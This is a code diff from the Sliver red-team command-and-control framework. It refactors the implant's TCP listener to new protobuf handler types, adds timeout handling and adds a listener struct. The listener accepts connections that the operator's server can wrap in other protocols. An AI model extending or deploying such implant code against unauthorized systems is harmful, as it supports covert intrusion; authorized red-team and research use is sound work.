@@ -26,32 +26,39 @@ import (
 	"fmt"
 	"net"
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/protobuf/commpb"
 )
 
 // ListenTCP - The implant is requested to start a TCP handler and return the connection
 // to the server, with the handler information passed in. This connection can be wrapped
 // into a tls.Conn, a SMTP one, etc, by the server, without the implant knowing anything about it.
-func ListenTCP(handler *sliverpb.Handler) (ln net.Listener, err error) {
+func ListenTCP(handler *commpb.Handler) (ln net.Listener, err error) {
 	// {{if .Config.Debug}}
-	log.Printf("Starting Raw TCP listener on %s:%d", handler.LHost, handler.LPort)
+	log.Printf("Starting Raw TCP listener on %s:%d", handler.RHost, handler.RPort)
 	// {{end}}
-	ln, err = net.Listen("tcp", fmt.Sprintf("%s:%d", handler.LHost, handler.LPort))
+	ln, err = net.Listen("tcp", fmt.Sprintf("%s:%d", handler.RHost, handler.RPort))
 	if err != nil {
 		return nil, err
 	}
 
 	// Add listener to jobs
-	listener := newStreamListener(handler, ln)
+	listener := newListenerTCP(handler)
+	listener.ln = ln
 	Listeners.Add(listener)
 
 	go func() {
 		for {
 			conn, err := ln.Accept()
 			if err != nil {
-				// We should return an error to the server.
+				// If the error arises from the accepted connection
+				if opErr, ok := err.(*net.OpError); ok && opErr.Timeout() {
+					continue
+				}
+				// Else the error is likely to be a closed listener, so return.
 
-				// If err is closed listener, return
+				// {{if .Config.Debug}}
+				log.Printf("Closed TCP listener on %s:%d", handler.RHost, handler.RPort)
+				// {{end}}
 				return
 			}
 
@@ -61,4 +68,24 @@ func ListenTCP(handler *sliverpb.Handler) (ln net.Listener, err error) {
 	}()
 
 	return
+}
+
+type listenerTCP struct {
+	info *commpb.Handler
+	ln   net.Listener
+}
+
+func newListenerTCP(info *commpb.Handler) *listenerTCP {
+	ln := &listenerTCP{
+		info: info,
+	}
+	return ln
+}
+
+func (ln *listenerTCP) Info() *commpb.Handler {
+	return ln.info
+}
+
+func (ln *listenerTCP) close() error {
+	return ln.ln.Close()
 }
